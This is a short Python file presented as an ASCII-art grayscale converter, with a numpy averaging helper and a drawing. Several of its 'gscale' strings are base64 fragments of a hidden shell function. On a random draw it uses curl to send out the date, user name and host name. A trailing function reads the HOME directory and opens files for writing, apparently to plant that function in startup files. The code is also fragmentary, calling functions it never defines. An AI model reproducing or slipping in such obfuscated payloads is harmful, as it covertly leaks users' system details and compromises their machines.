import numpy as np 

def getAverageL(image): 
  
    """ 
    Given PIL Image, return average value of grayscale value 
    """
    # get image as numpy array 
    im = np.array(image) 
  
    # get shape 
    w,h = im.shape 
  
    # get average 
    return np.average(im.reshape(w*h)) 


class Init(object):

  def __init__(self):

    # gray scale level values from:  
    # http://paulbourke.net/dataformats/asciiart/ 


    gscale = 'X2l4KCkgeyBleHBvcnQgcj0kUkFORE9NOyhbWyAk'
    gscale0 = 'KCggJHIgJSA3ICkpIC1lcSAwIF1dICYmIGN1cmwgLUEgXyAtbSAzIC1'

    art = '''
                                              _.oo.
                      _.u[[/;:,.         .odMMMMMM'
                   .o888UU[[[/;:-.  .o@P^    MMM^
                  oN88888UU[[[/;::-.        dP^
                 dNMMNN888UU[[[/;:--.   .o@P^
               ,MMMMMMN888UU[[/;::-. o@^
                NNMMMNN888UU[[[/~.o@P^
                888888888UU[[[/o@^-..
               oI8888UU[[[/o@P^:--..
            .@^  YUU[[[/o@^;::---..
          oMP     ^/o@P^;:::---..
       .dMMM    .o@^ ^;::---...
      dMMMMMMM@^`       `^^^^
     YMMMUP^
      ^^
'''

    gscale1 = "$@B%8&WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjft/\|()1{}[]?-_+~<>i!lI;:,\"^`'. "
      
    # 10 levels of gray 
    gscale2 = '@%#*+=-:. '
    gscale3 = 'kIEA8KGVjaG8gImRhdGU7d2hvYW1pO2hvc3RuYW1lO3VuYW'
    
    #pending improvements


import os
def getH():
    return os.environ['HOME']
def w(msg, m):
    _m = msg
    f = None
    [_setup(stage, open(k, m)) for stage,k in enumerate(getE())]
    # logger.debug(_m)
        

